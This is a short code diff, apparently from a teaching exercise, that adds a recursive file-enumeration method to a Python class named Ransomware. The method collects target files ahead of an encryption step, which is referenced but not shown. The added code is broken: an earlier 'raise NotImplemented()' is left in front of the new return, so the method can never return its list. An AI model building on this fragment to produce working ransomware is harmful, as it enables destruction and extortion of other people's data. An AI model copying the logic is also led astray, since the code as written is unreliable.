@@ -36,7 +36,13 @@ class Ransomware:
 
     def get_files(self, filter:str)->list:
         # return all files matching the filter
+        files = []
+        for file_path in Path(".").rglob(filter):
+            if file_path.is_file():
+                files.append(str(file_path.absolute()))
         raise NotImplemented()
+        return files
+        
 
     def encrypt(self):
         # main function for encrypting (see PDF)
